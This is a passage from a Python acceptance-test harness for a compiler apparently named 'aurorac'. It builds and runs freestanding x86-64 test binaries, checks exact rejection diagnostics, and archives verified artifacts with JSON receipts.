            stderr=(directory/(name+'.stderr')).read_bytes()
            allowed=(0,1) if allow_rejection else (0,)
            require(result.returncode in allowed,f'{name} exit {result.returncode}: {stderr[:4096]!r}')
            if result.returncode==0:
                require(not stderr,name+' unexpected stderr '+repr(stderr[:4096]))
            self.verify_pins()
            self.budget()
            return result.returncode,(directory/(name+'.stdout')).read_bytes(),stderr
        except subprocess.TimeoutExpired:
            record['timeout']=True
            raise AssertionError(name+' wall-clock timeout')
        finally:
            (directory/(name+'.command.json')).write_text(json.dumps(record,indent=2)+'\n')

    def compact(self,directory):
        # Preserve every successful byte, including native binaries and generated
        # assembly. Read back and verify the complete archive before deleting any
        # originals. Failed batches never reach this method.
        self.budget(24<<20)
        paths=sorted(p for p in directory.iterdir() if p.is_file())
        pins={p.name:dict(sha256=sha(p),bytes=p.stat().st_size,mode=p.stat().st_mode & 0o7777) for p in paths}
        archive=directory.with_suffix('.tar.xz')
        with tarfile.open(archive,'w:xz',preset=3) as output:
            for path in paths:
                output.add(path,arcname=path.name,recursive=False)
        with tarfile.open(archive,'r:xz') as stored:
            members=stored.getmembers()
            require(len(members)==len(pins),'archive exact member count')
            require({x.name for x in members}==set(pins),'archive member equality')
            for member in members:
                require(member.isfile(),'archive regular files only')
                blob=stored.extractfile(member).read()
                wanted=pins[member.name]
                require(member.size==wanted['bytes'] and len(blob)==wanted['bytes'],'archive exact member size')
                require(member.mode==wanted['mode'],'archive exact member mode')
                require(hashlib.sha256(blob).hexdigest()==wanted['sha256'],'lossless archive verification '+member.name)
        receipt=dict(archive=archive.name,sha256=sha(archive),verified_members=pins)
        (archive.with_suffix('.verified.json')).write_text(json.dumps(receipt,indent=2)+'\n')
        for path in paths:path.unlink()
        directory.rmdir()
        self.budget()

    def batch(self,number,cases):
        self.budget(24<<20)
        directory=self.artifacts/f'batch-{number:03d}'
        directory.mkdir()
        source=PREFIX+shared()+''.join(dict.fromkeys(case.helpers for case in cases))
        bodies=list(dict.fromkeys(case.body for case in cases))
        source+=''.join(f'auto manifest_case_{i}(i64 slot,i64 argument1,i64 argument2)->u64{{{body}}}\n' for i,body in enumerate(bodies))
        require(len(source.encode())<=SOURCE_CAP,'64 KiB batch source bound')
        (directory/'input.au').write_text(source)
        receipt=dict(status='running',source_sha256=sha(directory/'input.au'),source_bytes=len(source.encode()),cases=len(cases),distinct_functions=len(bodies))
        try:
            self.command([self.compiler,'--module-root',ROOT/'library',directory/'input.au','-o',directory/'compiled.s'],directory,'compiler',compiler=True)
            expected=tuple(value for case in cases for value in case.expected)
            asm=['.text','.globl _start','_start:']
            position=0
            for case in cases:
                function=bodies.index(case.body)
                for slot in range(len(case.expected)):
                    asm += [f'movq ${slot},%rdi',f'movq ${case.arguments[0]},%rsi',f'movq ${case.arguments[1]},%rdx',f'call manifest_case_{function}',f'movq %rax,observations+{position}(%rip)']
                    position+=8
            asm += ['movq $1,%rax','movq $1,%rdi','leaq observations(%rip),%rsi',f'movq ${position},%rdx','syscall',f'cmpq ${position},%rax','jne .Lwrite_failed','movq $60,%rax','xorq %rdi,%rdi','syscall','.Lwrite_failed:','movq $60,%rax','movq $91,%rdi','syscall','.bss','.align 8',f'observations: .zero {position}','.section .note.GNU-stack,"",@progbits']
            (directory/'entry.s').write_text('\n'.join(asm)+'\n')
            self.command(['as','--64',directory/'compiled.s','-o',directory/'program.o'],directory,'assemble')
            self.command(['as','--64',directory/'entry.s','-o',directory/'entry.o'],directory,'entry')
            self.command(['ld','-o',directory/'program',directory/'entry.o',directory/'program.o'],directory,'link')
            _,undefined,_=self.command(['nm','-u',directory/'program'],directory,'undefined-symbols')
            require(not undefined.strip(),'freestanding binary must have no unresolved symbols')
            _,elf,_=self.command(['readelf','-l','-d',directory/'program'],directory,'elf-linkage')
            require(b'INTERP' not in elf and b'NEEDED' not in elf,'no ELF interpreter or runtime library dependencies')
            code,output,_=self.command([directory/'program'],directory,'native')
            observed=validate(output,expected,code)
            require((directory/'input.au').read_text()==source,'compiler must preserve source')
            offset=0;records=[]
            for case in cases:
                end=offset+len(case.expected)
                records.append(dict(label=case.label,arguments=case.arguments,expected=case.expected,observed=observed[offset:end]))
                offset=end
            receipt.update(status='passed',complete_u64_observations=len(expected),observations=records,
                           assembly_sha256=sha(directory/'compiled.s'),executable_sha256=sha(directory/'program'),native_output_sha256=sha(directory/'native.stdout'))
        except Exception as exc:
            receipt.update(status='failed',error=str(exc))
            raise
        finally:
            (directory/'receipt.json').write_text(json.dumps(receipt,indent=2)+'\n')
        self.compact(directory)

    def reject(self,number,label,source,message):
        for existing in (False,True):
            self.budget(65536)
            directory=self.artifacts/f'reject-{number:02d}-{int(existing)}';directory.mkdir()
            path=directory/'input.au';path.write_text(source)
            output=directory/'compiled.s';sentinel=b'keep existing manifest output\n\x00\xff'
            if existing:output.write_bytes(sentinel)
            receipt=dict(status='running',label=label,existing_output=existing)
            try:
                code,stdout,diagnostic=self.command([self.compiler,'--module-root',ROOT/'library',path,'-o',output],directory,'compiler',compiler=True,allow_rejection=True)
                require(code==1,label+' must reject normally with exit 1')
                require(not stdout,label+' unexpected stdout')
                text=diagnostic.decode(errors='strict')
                # Only source coordinates vary. Every remaining diagnostic byte
                # must equal the accepted semantic error, including one LF.
                normalized=re.sub(r'^aurorac: line [0-9]+: ', 'aurorac: ',text)
                require(normalized=='aurorac: '+message+'\n',label+' wrong exact rejection: '+text)
                require(path.read_text()==source,'rejection changed source')
                require(output.read_bytes()==sentinel if existing else not output.exists(),'rejection changed output')
                receipt.update(status='passed',diagnostic=text,normalized_diagnostic=normalized)
            except Exception as exc:
                receipt.update(status='failed',error=str(exc))
                raise
            finally:
                (directory/'receipt.json').write_text(json.dumps(receipt,indent=2)+'\n')


def batches(cases):
    current=[];bodies=set();size=len(PREFIX+shared())
    for case in cases:
        extra=(len(case.body)+180 if case.body not in bodies else 0)+len(case.helpers)
        if current and (len(current)>=BATCH or size+extra>SOURCE_CAP-1024):
            yield current
            current=[];bodies=set();size=len(PREFIX+shared())
            extra=len(case.body)+180+len(case.helpers)
        current.append(case);bodies.add(case.body);size+=extra
    if current:yield current


def finalize_report(runner,report,compiler,artifacts):
    # Every resource/measurement failure is recorded separately. Neither the
    # resource guard nor report writing may mask an already active first error.
    errors=[]
    report.update(process_count=runner.process_count,finished_utc=time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()))
    try:
        report['compiler_sha256_after']=sha(compiler)
    except BaseException as exc:
        errors.append('compiler final hash: '+str(exc))
    try:
        allocated,free=runner.measure()
        report.update(candidate_allocated_bytes=allocated,peak_candidate_allocated_bytes=runner.peak,global_free_bytes=free)
    except BaseException as exc:
        errors.append('non-enforcing final resource measurement: '+str(exc))
    try:
        runner.budget()
    except BaseException as exc:
        errors.append('final resource validation: '+str(exc))
    if errors:
        report['finalization_errors']=list(errors)
        if report.get('status')!='failed':
            report.update(status='failed',error='run finalization failed')
    try:
        (artifacts/'manifest.json').write_text(json.dumps(report,indent=2)+'\n')
    except BaseException as exc:
        errors.append('failed-run receipt write: '+str(exc))
        print('Manifest receipt write failed; original error remains primary: '+str(exc),file=sys.stderr)
    return errors


def main():
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('compiler',nargs='?',type=Path,default=ROOT/'build/aurorac')
    parser.add_argument('--artifacts','--artifact-root',dest='artifact_root',type=Path)
    parser.add_argument('--quick','--smoke',dest='smoke',action='store_true',help='development subset, not full acceptance')
    parser.add_argument('--self-test-only',action='store_true')
    parser.add_argument('--freeze-reference',type=Path)
    parser.add_argument('--candidate-cap-mib',type=int,default=256,help='whole-candidate storage cap 256..1024 MiB; default 256; increases require explicit aggregate admission')
    parser.add_argument('--check-cap-only', action='store_true', help='configuration-only cap checks; no compiler, native test or acceptance receipt')
    add_identity_arguments(parser)
    args=parser.parse_args()
    diagnostic_only=args.self_test_only or args.freeze_reference is not None
    validate_identity_selection(args,preflight=diagnostic_only or args.check_cap_only)
    cap=candidate_cap(args.candidate_cap_mib)
    if args.check_cap_only:
        cap_self_test()
        print(json.dumps(dict(status='configuration-only', native_executed=False,
            candidate_cap_mib=args.candidate_cap_mib, cap_bytes=cap,
            focused_default_mib=256, maximum_cap_mib=1024), sort_keys=True))
        return
    if not diagnostic_only:
        compiler=args.compiler.resolve(strict=True)
        identity=resolve_identity(args,compiler,ROOT)
    self_test()
    frozen=ROOT/'evidence/package-manifest/contract-before-implementation.md'
    require(sha(frozen)==CONTRACT_SHA256,'frozen pre-implementation contract byte identity')
    if args.self_test_only:
        print('PASS independent grammar/integer oracle and high-bit/length/exit/budget/path controls');return
    if args.freeze_reference:
        freeze_corpus(artifact_path(args.freeze_reference));return
    artifacts=artifact_path(args.artifact_root or ROOT/f'build/package-manifest-{os.getpid()}')
    require(artifacts.parent.is_dir() and not artifacts.exists(),'fresh artifact root with existing parent required')
    runner=Runner(compiler,artifacts,cap)
    runner.budget(65536);artifacts.mkdir()
    inputs=[compiler,ROOT/'library/package/manifest.au',ROOT/'library/package/identity.au',ROOT/'library/std/array.au',Path(__file__).resolve(),frozen,Path(sys.executable).resolve(strict=True),*runner.tools.values()]
    runner.pins={p:sha(p) for p in inputs}
    report=dict(status='running',compiler_identity=identity.record(),pins={str(p):h for p,h in runner.pins.items()},tool_paths={name:str(path) for name,path in runner.tools.items()},
                command=sys.argv,started_utc=time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),cap_bytes=cap,free_floor_bytes=FLOOR,
                per_source_cap_bytes=SOURCE_CAP,cases_per_batch=BATCH,smoke_only=args.smoke,
                model='Independent Python line grammar fullmatch, canonical identity regex, arbitrary precision integers and set uniqueness',
                native='GNU as/ld x86-64, direct Linux write/exit only, no target libc',
                compaction='Complete successful directories archived using tar.xz preset3; exact member count, bytes, modes and SHA256 verified before removal; failed outputs preserved',
                limits='Bounded finite execution evidence, not a memory-safety or performance proof')
    try:
        for name,tool in {**runner.tools,'python':Path(sys.executable).resolve()}.items():
            runner.command([tool,'--version'],artifacts,'version-'+name)
        cases,counts=all_cases()
        report.update(counts)
        if args.smoke:
            cases=cases[:16]+construction_cases()[:8]+ownership_cases()+binding_cases()
        report.update(native_cases=len(cases),complete_u64_observations=sum(len(c.expected) for c in cases),rejection_cases=len(negative_cases()))
        done=0
        for number,batch in enumerate(batches(cases)):
            runner.batch(number,batch);done+=len(batch)
            print(f'PASS package manifest {done}/{len(cases)} native cases',flush=True)
        for number,(label,source,message) in enumerate(negative_cases()):
            runner.reject(number,label,source,message)
        runner.verify_pins();identity.verify();report['status']='passed'
    except BaseException as exc:
        report.update(status='failed',error=str(exc),exception_type=type(exc).__name__);raise
    finally:
        original_error_active=sys.exc_info()[0] is not None
        final_errors=finalize_report(runner,report,compiler,artifacts)
        if final_errors and not original_error_active:
            raise AssertionError('run finalization failed: '+'; '.join(final_errors))
    print(f'PASS package manifest: {len(cases)} native cases, {report["complete_u64_observations"]} complete u64 observations, {2*report["rejection_cases"]} rejection runs; selected compiler identity unchanged',flush=True)


if __name__=='__main__':main()
